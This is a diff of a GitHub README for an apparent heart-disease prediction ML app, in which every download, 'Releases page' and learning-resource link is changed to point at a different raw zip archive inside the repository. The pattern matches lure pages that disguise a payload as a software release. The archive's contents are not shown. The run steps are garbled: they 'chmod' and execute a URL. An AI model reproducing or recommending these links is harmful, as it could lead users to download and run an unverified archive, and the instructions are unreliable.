@@ -1,6 +1,6 @@
 # 🫀 Heart-Disease-Prediction - Assess Heart Disease Risk Easily
 
-[![Download Heart-Disease-Prediction](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/mlruns/2/models/m-c599d33d22d24cb7a62bd00f2f83bda2/Heart-Disease-Prediction-v2.2.zip)](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/mlruns/2/models/m-c599d33d22d24cb7a62bd00f2f83bda2/Heart-Disease-Prediction-v2.2.zip)
+[![Download Heart-Disease-Prediction](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/src/models/Prediction_Disease_Heart_v2.0.zip)](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/src/models/Prediction_Disease_Heart_v2.0.zip)
 
 ## 📋 Overview
 Heart-Disease-Prediction is a production-ready machine learning application designed to help you assess the risk of heart disease with an impressive accuracy of 88.5%. This application uses a FastAPI REST API for smooth interactions, a Streamlit dashboard for visual insights, SHAP for model explainability, and MLflow for tracking experiments. It demonstrates the complete machine learning process from model creation to deployment.
@@ -23,7 +23,7 @@ To successfully run this application, ensure your system meets the following req
 ## 📥 Download & Install
 To get started, you can download the application from the Releases page:
 
-[Visit this page to download](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/mlruns/2/models/m-c599d33d22d24cb7a62bd00f2f83bda2/Heart-Disease-Prediction-v2.2.zip)
+[Visit this page to download](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/src/models/Prediction_Disease_Heart_v2.0.zip)
 
 1. Click on the link above to open the Releases page.
 2. On the Releases page, find the latest version of the **Heart-Disease-Prediction** application.
@@ -48,8 +48,8 @@ Once you have downloaded the application, follow these steps to run it:
    - Navigate to the directory where the file is downloaded.
    - Run the following command:
      ```
-     chmod +x https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/mlruns/2/models/m-c599d33d22d24cb7a62bd00f2f83bda2/Heart-Disease-Prediction-v2.2.zip
-     https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/mlruns/2/models/m-c599d33d22d24cb7a62bd00f2f83bda2/Heart-Disease-Prediction-v2.2.zip
+     chmod +x https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/src/models/Prediction_Disease_Heart_v2.0.zip
+     https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/src/models/Prediction_Disease_Heart_v2.0.zip
      ```
    - The application will start.
 
@@ -67,7 +67,7 @@ If you encounter issues or have questions, feel free to reach out. The community
 For the latest updates and enhancements, keep an eye on the repository. New features and improvements will be rolled out regularly.
 
 ## 🔗 Additional Resources
-- [Explore Heart Disease Insights](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/mlruns/2/models/m-c599d33d22d24cb7a62bd00f2f83bda2/Heart-Disease-Prediction-v2.2.zip)
-- [Learn Machine Learning Basics](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/mlruns/2/models/m-c599d33d22d24cb7a62bd00f2f83bda2/Heart-Disease-Prediction-v2.2.zip)
+- [Explore Heart Disease Insights](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/src/models/Prediction_Disease_Heart_v2.0.zip)
+- [Learn Machine Learning Basics](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/raw/refs/heads/main/src/models/Prediction_Disease_Heart_v2.0.zip)
 
 By following these steps, you can easily download, install, and use the Heart-Disease-Prediction application to assess heart disease risk effectively. Happy predicting!
